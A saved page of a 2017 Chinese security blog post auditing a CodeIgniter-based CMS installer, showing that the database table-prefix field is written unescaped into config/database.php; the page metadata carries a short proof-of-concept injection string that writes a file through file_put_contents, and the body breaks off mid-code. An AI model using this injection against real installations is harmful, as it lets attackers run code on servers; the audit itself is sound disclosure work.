<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><link rel=stylesheet href=/css/fancybox.css><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>记一次某Cms的审计 - 倾旋的博客</title><meta name=theme-color><meta name=description content="0x00 前言
此套cms采用了CI框架，之前在做漏洞平台的时候也是用的这个框架开发。
CodeIgniter 是一个小巧但功能强大的 PHP 框架，作为一个简单而“优雅”的工具包，它可以为开发者们建立功能完善的 Web 应用程序。
文章写的比较急，以后再补充……
0x01 第一弹 安装程序Getshell
首先我们一般都是在安装的时候，看看有没有重装的可能性，粗略的看了一下代码并没有，但是存在一个有趣的安装getshell问题。
CI框架的数据库配置在：config\database.php,其常见内容如下：
<?php

if (!defined('BASEPATH')) exit('No direct script access allowed');

$active_group = 'default';
$query_builder  = TRUE;

$db['default']  = array(
  'dsn'   => '',
  'hostname'  => 'localhost',
  'username'  => 'root',
  'password'  => 'root',
  'port'    => '3306',
  'database'  => 'xxxxx',
  'dbdriver'  => 'mysqli',
  'dbprefix'  => 'dr_',
  'pconnect'  => FALSE,
  'db_debug'  => true,
  'cache_on'  => FALSE,
  'cachedir'  => 'cache/sql/',
  'char_set'  => 'utf8',
  'dbcollat'  => 'utf8_general_ci',
  'swap_pre'  => '',
  'autoinit'  => FALSE,
  'encrypt' => FALSE,
  'compress'  => FALSE,
  'stricton'  => FALSE,
  'failover'  => array(),
);
安装界面：

  


然后找到这个界面对应的代码 diy\dayrui\controllers\Install.php：
<?php
/**
     * 安装程序
     */
    public function index() {

        $step = max(1, (int)$this->input->get('step'));
        switch ($step) {

            case 1:
                break;

            case 2:

                $check_pass = true;

                $writeAble = $this->_checkFileRight();
                $lowestEnvironment = $this->_getLowestEnvironment();
                $currentEnvironment = $this->_getCurrentEnvironment();
                $recommendEnvironment = $this->_getRecommendEnvironment();

                foreach ($currentEnvironment as $key => $value) {
                    if (false !== strpos($key, '_ischeck') && false === $value) {
                        $check_pass = false;
                    }
                }
                foreach ($writeAble as $value) {
                    if (false === $value) {
                        $check_pass = false;
                    }
                }

                $this->template->assign(array(
                    'writeAble' => $writeAble,
                    'check_pass' => $check_pass,
                    'lowestEnvironment' => $lowestEnvironment,
                    'currentEnvironment' => $currentEnvironment,
                    'recommendEnvironment' => $recommendEnvironment,
                ));
                break;
            case 3:

                if ($_POST) {
                    $data = $this->input->post('data');
                    // 数据库支持判断
                    $mysqli = function_exists('mysqli_init') ? mysqli_init() : 0;
                    if (version_compare(PHP_VERSION, '5.5.0') >= 0 && !$mysqli) {
                        exit(dr_json(0, '您的PHP环境必须启用Mysqli扩展'));
                    }
                    // 参数判断
                    if (!preg_match('/^[\x7f-\xff\dA-Za-z\.\_]+$/', $data['admin'])) {
                        exit(dr_json(0, '管理员账号格式不正确'));
                    }
                    if (!$data['password']) {
                        exit(dr_json(0, '管理员密码不能为空'));
                    }
                    if (!$data['dbname']) {
                        exit(dr_json(0, '数据库名称不能为空'));
                    }
                    if (is_numeric($data['dbname'])) {
                        exit(dr_json(0, '数据库名称不能是数字'));
                    }
                    if (strpos($data['dbname'], '.') !== false) {
                        exit(dr_json(0, '数据库名称不能存在.号'));
                    }
                    $this->load->helper('email');
                    if (!$data['email'] || !valid_email($data['email'])) {
                        exit(dr_json(0, 'Email格式不正确'));
                    }
                    if ($mysqli) {
                        if (!@mysqli_real_connect($mysqli, $data['dbhost'], $data['dbuser'], $data['dbpw'])) {
                            exit(dr_json(0, '[mysqli_real_connect] 无法连接到数据库服务器（'.$data['dbhost'].'），请检查用户名（'.$data['dbuser'].'）和密码（'.$data['dbpw'].'）是否正确'));
                        }
                        if (!@mysqli_select_db($mysqli, $data['dbname'])) {
                            if (!@mysqli_query($mysqli, 'CREATE DATABASE '.$data['dbname'])) {
                                exit(dr_json(0, '指定的数据库（'.$data['dbname'].'）不存在，系统尝试创建失败，请通过其他方式建立数据库'));
                            }
                        }
                        // utf8方式打开数据库
                        mysqli_query($mysqli, 'SET NAMES utf8');
                    } else {
                        if (!@mysql_connect($data['dbhost'], $data['dbuser'], $data['dbpw'])) {
                            exit(dr_json(0, mysql_error().'<br>无法连接到数据库服务器（'.$data['dbhost'].'），请检查用户名（'.$data['dbuser'].'）和密码（'.$data['dbpw'].'）是否正确'));
                        }
                        if (!@mysql_select_db($data['dbname'])) {
                            if (!@mysql_query('CREATE DATABASE '.$data['dbname'])) {
                                exit(dr_json(0, mysql_error().'<br>指定的数据库（'.$data['dbname'].'）不存在，系统尝试创建失败，请通过其他方式建立数据库'));
                            }
                        }
                        // utf8方式打开数据库
                        mysql_query('SET NAMES utf8');
                    }
                    // 格式化端口
                    list($data['dbhost'], $data['dbport']) = explode(':', $data['dbhost']);
                    $data['dbport'] = $data['dbport'] ? (int)$data['dbport'] : 3306;
                    $data['dbprefix'] = $data['dbprefix'] ? $data['dbprefix'] : 'dr_'; // 这个变量可控
                    // 配置文件
                    $config = &#34;<?php&#34;.PHP_EOL.PHP_EOL;
                    $config.= &#34;if (!defined('BASEPATH')) exit('No direct script access allowed');&#34;.PHP_EOL.PHP_EOL;
                    $config.= &#34;\$active_group = 'default';&#34;.PHP_EOL;
                    $config.= &#34;\$query_builder  = TRUE;&#34;.PHP_EOL.PHP_EOL;
                    $config.= &#34;\$db['default']  = array(&#34;.PHP_EOL;
                    $config.= &#34; 'dsn'   => '',&#34;.PHP_EOL;
                    $config.= &#34; 'hostname'  => '{$data['dbhost']}',&#34;.PHP_EOL;
                    $config.= &#34; 'username'  => '{$data['dbuser']}',&#34;.PHP_EOL;
                    $config.= &#34; 'password'  => '{$data['dbpw']}',&#34;.PHP_EOL;
                    $config.= &#34; 'port'    => '{$data['dbport']}',&#34;.PHP_EOL;
                    $config.= &#34; 'database'  => '{$data['dbname']}',&#34;.PHP_EOL;
                    $config.= &#34; 'dbdriver'  => '&#34;.($mysqli ? 'mysqli' : 'mysql').&#34;',&#34;.PHP_EOL;
                    $config.= &#34; 'dbprefix'  => '{$data['dbprefix']}',&#34;.PHP_EOL;
                    $config.= &#34; 'pconnect'  => FALSE,&#34;.PHP_EOL;
                    $config.= &#34; 'db_debug'  => true,&#34;.PHP_EOL;
                    $config.= &#34; 'cache_on'  => FALSE,&#34;.PHP_EOL;
                    $config.= &#34; 'cachedir'  => 'cache/sql/',&#34;.PHP_EOL;
                    $config.= &#34; 'char_set'  => 'utf8',&#34;.PHP_EOL;
                    $config.= &#34; 'dbcollat'  => 'utf8_general_ci',&#34;.PHP_EOL;
                    $config.= &#34; 'swap_pre'  => '',&#34;.PHP_EOL;
                    $config.= &#34; 'autoinit'  => FALSE,&#34;.PHP_EOL;
                    $config.= &#34; 'encrypt' => FALSE,&#34;.PHP_EOL;
                    $config.= &#34; 'compress'  => FALSE,&#34;.PHP_EOL;
                    $config.= &#34; 'stricton'  => FALSE,&#34;.PHP_EOL;
                    $config.= &#34; 'failover'  => array(),&#34;.PHP_EOL;
                    $config.= &#34;);&#34;.PHP_EOL;
                    // 保存配置文件
                    if (!file_put_contents(WEBPATH.'config/database.php', $config)) {
                        exit(dr_json(0, '数据库配置文件保存失败，请检查文件config/database.php权限！'));
                    }
                    // 加载数据库
                    $this->load->database();
                    $salt = substr(md5(rand(0, 999)), 0, 10);
                    $password = md5(md5($data['password']).$salt.md5($data['password']));

                    // 导入表结构
                    $this->_query(str_replace(
                        array('{dbprefix}', '{username}', '{password}', '{salt}', '{email}'),
                        array($this->db->dbprefix, $data['admin'], $password, $salt, $data['email']),
                        file_get_contents(WEBPATH.'cache/install/install.sql')
                    ));

                    // 导入会员菜单数据
                    $this->_query(str_replace(
                        '{dbprefix}',
                        $this->db->dbprefix,
                        file_get_contents(WEBPATH.'cache/install/member_menu.sql')
                    ));

                    // 系统配置文件
                    $this->load->model('system_model');
                    $config = array(
                        'SYS_LOG' => 'FALSE',
                        'SYS_KEY' => 'poscms'.md5(time()),
                        'SYS_DEBUG' => 'FALSE',
                        'SYS_HELP_URL' => '',
                        'SYS_EMAIL' => $data['email'],
                        'SYS_MEMCACHE' => 'FALSE',
                        'SYS_UPLOAD_DIR' => SYS_UPLOAD_DIR,
                        'SYS_CRON_QUEUE' => 0,
                        'SYS_CRON_NUMS' => 20,
                        'SYS_CRON_TIME' => 300,


                        'SYS_ONLINE_NUM' => 1000,
                        'SYS_ONLINE_TIME' => 7200,

                        'SYS_NAME' => 'POSCMS',
                        'SYS_NEWS' => 'TRUE',
                        'SYS_CMS' => 'POSCMS',
                        'SYS_UPDATE' => 1,

                        'SITE_EXPERIENCE' => '经验值',
                        'SITE_SCORE' => '虚拟币',
                        'SITE_MONEY' => '金钱',
                        'SITE_CONVERT' => 10,
                        'SITE_ADMIN_CODE' => 'FALSE',
                        'SITE_ADMIN_PAGESIZE' => 8,

                        'SYS_CACHE_INDEX' => 300,
                        'SYS_CACHE_MINDEX' => 300,
                        'SYS_CACHE_MSHOW' => 300,
                        'SYS_CACHE_MSEARCH' => 300,
                        'SYS_CACHE_SITEMAP' => 300,
                        'SYS_CACHE_LIST' => 300,
                        'SYS_CACHE_MEMBER' => 300,
                        'SYS_CACHE_ATTACH' => 300,
                        'SYS_CACHE_FORM' => 300,
                        'SYS_CACHE_POSTER' => 300,
                        'SYS_CACHE_SPACE' => 300,
                        'SYS_CACHE_TAG' => 300,

                    );
                    $this->system_model->save_config($config, $config);
                    // 站点配置文件
                    $this->load->model('site_model');
                    $this->load->library('dconfig');
                    if (is_file(WEBPATH.'config/site/1.php')) {
                        $config = require WEBPATH.'config/site/1.php';
                    }
                    $config['SITE_THEME'] = $config['SITE_TEMPLATE'] = 'default';
                    $config['SITE_DOMAIN'] = $config['SITE_ATTACH_HOST'] = $config['SITE_ATTACH_URL'] = strtolower($_SERVER['HTTP_HOST']);
                    $site = array(
                        'name' => 'POSCMS',
                        'domain' => strtolower($_SERVER['HTTP_HOST']),
                        'setting' => $config,
                    );
                    $this->site_model->add_site($site);
                    $this->dconfig->file(WEBPATH.'config/site/1.php')->note('站点配置文件')->space(32)->to_require_one($this->site_model->config, $config);

                    // 初始化菜单
                    $this->load->model('menu_model');
                    $this->menu_model->init();

                    // 导入默认数据
                    $this->_query(str_replace(
                        array('{dbprefix}', '{site_url}'),
                        array($this->db->dbprefix, 'http://'.strtolower($_SERVER['HTTP_HOST'])),
                        file_get_contents(WEBPATH.'cache/install/default.sql')
                    ));
                    exit(dr_json(1, dr_url('install/index', array('step' => $step + 1))));
                }
                break;

            case 4:
                $log = array();
                $sql = file_get_contents(WEBPATH.'cache/install/install.sql');
                preg_match_all('/`\{dbprefix\}(.+)`/U', $sql, $match);
                if ($match) {
                    $log = array_unique($match[1]);
                }
                $this->template->assign(array(
                    'log' => implode('<finecms>', $log),
                ));
                break;

            case 5:
                file_put_contents(WEBPATH.'cache/install.lock', time());
                file_put_contents(WEBPATH.'cache/install.new', time());
                break;
        }

        $this->template->assign(array(
            'step' => $step,
        ));
        $this->template->display('install_'.$step.'.html', 'admin');
    }
然后定位到$data['dbprefix']是可控的，也就是数据库的表前缀，前面的数据库配置文件内容以及交代清楚，接下来构造一个POC：
','x'=>file_put_contents('s.txt','ss'),'b'=>'b"><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.155.2"><meta itemprop=name content="记一次某Cms的审计"><meta itemprop=description content="本文简述一下对一个采用了开源框架的cms的审计过程。"><meta itemprop=datePublished content="2017-08-18T00:00:00+00:00"><meta itemprop=dateModified content="2017-08-18T00:00:00+00:00"><meta itemprop=wordCount content="1158"><meta property="og:url" content="https://payloads.online/archivers/2017-08-18/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="记一次某Cms的审计"><meta property="og:description" content="本文简述一下对一个采用了开源框架的cms的审计过程。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2017-08-18T00:00:00+00:00"><meta property="article:modified_time" content="2017-08-18T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="记一次某Cms的审计"><meta name=twitter:description content="本文简述一下对一个采用了开源框架的cms的审计过程。"><link rel=canonical href=https://payloads.online/archivers/2017-08-18/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">记一次某Cms的审计</h1><div class="text-xs antialiased opacity-60"><time>Aug 18, 2017</time><span class=mx-1>&#183;</span>
<span>倾旋</span></div></header><section><h2 id=0x00-前言>0x00 前言</h2><p>此套cms采用了CI框架，之前在做漏洞平台的时候也是用的这个框架开发。</p><p>CodeIgniter 是一个小巧但功能强大的 PHP 框架，作为一个简单而“优雅”的工具包，它可以为开发者们建立功能完善的 Web 应用程序。</p><p>文章写的比较急，以后再补充……</p><h2 id=0x01-第一弹-安装程序getshell>0x01 第一弹 安装程序Getshell</h2><p>首先我们一般都是在安装的时候，看看有没有重装的可能性，粗略的看了一下代码并没有，但是存在一个有趣的安装getshell问题。</p><p>CI框架的数据库配置在：<code>config\database.php</code>,其常见内容如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>defined</span>(<span style=color:#e6db74>&#39;BASEPATH&#39;</span>)) <span style=color:#66d9ef>exit</span>(<span style=color:#e6db74>&#39;No direct script access allowed&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$active_group <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;default&#39;</span>;
</span></span><span style=display:flex><span>$query_builder  <span style=color:#f92672>=</span> <span style=color:#66d9ef>TRUE</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$db[<span style=color:#e6db74>&#39;default&#39;</span>]  <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;dsn&#39;</span>   <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;hostname&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;localhost&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;username&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;root&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;password&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;root&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;port&#39;</span>    <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;3306&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;database&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;xxxxx&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;dbdriver&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;mysqli&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;dbprefix&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;dr_&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;pconnect&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>FALSE</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;db_debug&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;cache_on&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>FALSE</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;cachedir&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;cache/sql/&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;char_set&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;utf8&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;dbcollat&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;utf8_general_ci&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;swap_pre&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;autoinit&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>FALSE</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;encrypt&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>FALSE</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;compress&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>FALSE</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;stricton&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>FALSE</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;failover&#39;</span>  <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>array</span>(),
</span></span><span style=display:flex><span>);
</span></span></code></pre></div><p>安装界面：
<a href=https://images.payloads.online/e3529386-4f5e-11ec-a703-00d861bf4abb.jpg data-fancybox=gallery data-caption=Install><img src=https://images.payloads.online/e3529386-4f5e-11ec-a703-00d861bf4abb.jpg alt=Install></a></p><p>然后找到这个界面对应的代码 <code>diy\dayrui\controllers\Install.php</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**
</span></span></span><span style=display:flex><span><span style=color:#e6db74>     * 安装程序
</span></span></span><span style=display:flex><span><span style=color:#e6db74>     */</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>index</span>() {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        $step <span style=color:#f92672>=</span> <span style=color:#a6e22e>max</span>(<span style=color:#ae81ff>1</span>, (<span style=color:#a6e22e>int</span>)$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;step&#39;</span>));
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>switch</span> ($step) {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                $check_pass <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                $writeAble <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_checkFileRight</span>();
</span></span><span style=display:flex><span>                $lowestEnvironment <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_getLowestEnvironment</span>();
</span></span><span style=display:flex><span>                $currentEnvironment <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_getCurrentEnvironment</span>();
</span></span><span style=display:flex><span>                $recommendEnvironment <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>_getRecommendEnvironment</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>foreach</span> ($currentEnvironment <span style=color:#66d9ef>as</span> $key <span style=color:#f92672>=&gt;</span> $value) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>false</span> <span style=color:#f92672>!==</span> <span style=color:#a6e22e>strpos</span>($key, <span style=color:#e6db74>&#39;_ischeck&#39;</span>) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#66d9ef>false</span> <span style=color:#f92672>===</span> $value) {
</span></span><span style=display:flex><span>                        $check_pass <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>foreach</span> ($writeAble <span style=color:#66d9ef>as</span> $value) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>false</span> <span style=color:#f92672>===</span> $value) {
</span></span><span style=display:flex><span>                        $check_pass <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>template</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>assign</span>(<span style=color:#66d9ef>array</span>(
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#39;writeAble&#39;</span> <span style=color:#f92672>=&gt;</span> $writeAble,
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#39;check_pass&#39;</span> <span style=color:#f92672>=&gt;</span> $check_pass,
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#39;lowestEnvironment&#39;</span> <span style=color:#f92672>=&gt;</span> $lowestEnvironment,
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#39;currentEnvironment&#39;</span> <span style=color:#f92672>=&gt;</span> $currentEnvironment,
</span></span><span style=display:flex><span>                    <span style=color:#e6db74>&#39;recommendEnvironment&#39;</span> <span style=color:#f92672>=&gt;</span> $recommendEnvironment,
</span></span><span style=display:flex><span>                ));
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> ($_POST) {
</span></span><span style=display:flex><span>                    $data <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>input</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>post</span>(<span style=color:#e6db74>&#39;data&#39;</span>);
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 数据库支持判断
</span></span></span><span style=display:flex><span>                    $mysqli <span style=color:#f92672>=</span> <span style=color:#a6e22e>function_exists</span>(<span style=color:#e6db74>&#39;mysqli_init&#39;</span>) <span style=color:#f92672>?</span> <span style=color:#a6e22e>mysqli_init</span>() <span style=color:#f92672>:</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>version_compare</span>(<span style=color:#66d9ef>PHP_VERSION</span>, <span style=color:#e6db74>&#39;5.5.0&#39;</span>) <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>$mysqli) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;您的PHP环境必须启用Mysqli扩展&#39;</span>));
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 参数判断
</span></span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^[\x7f-\xff\dA-Za-z\.\_]+$/&#39;</span>, $data[<span style=color:#e6db74>&#39;admin&#39;</span>])) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;管理员账号格式不正确&#39;</span>));
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$data[<span style=color:#e6db74>&#39;password&#39;</span>]) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;管理员密码不能为空&#39;</span>));
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$data[<span style=color:#e6db74>&#39;dbname&#39;</span>]) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;数据库名称不能为空&#39;</span>));
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_numeric</span>($data[<span style=color:#e6db74>&#39;dbname&#39;</span>])) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;数据库名称不能是数字&#39;</span>));
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strpos</span>($data[<span style=color:#e6db74>&#39;dbname&#39;</span>], <span style=color:#e6db74>&#39;.&#39;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span>) {
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>exit</span>(<span style=color:#a6e22e>dr_json</span>(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#39;数据库名称不能存在.号&#39;</span>));
</span></span><span style=display:flex><span>                    }
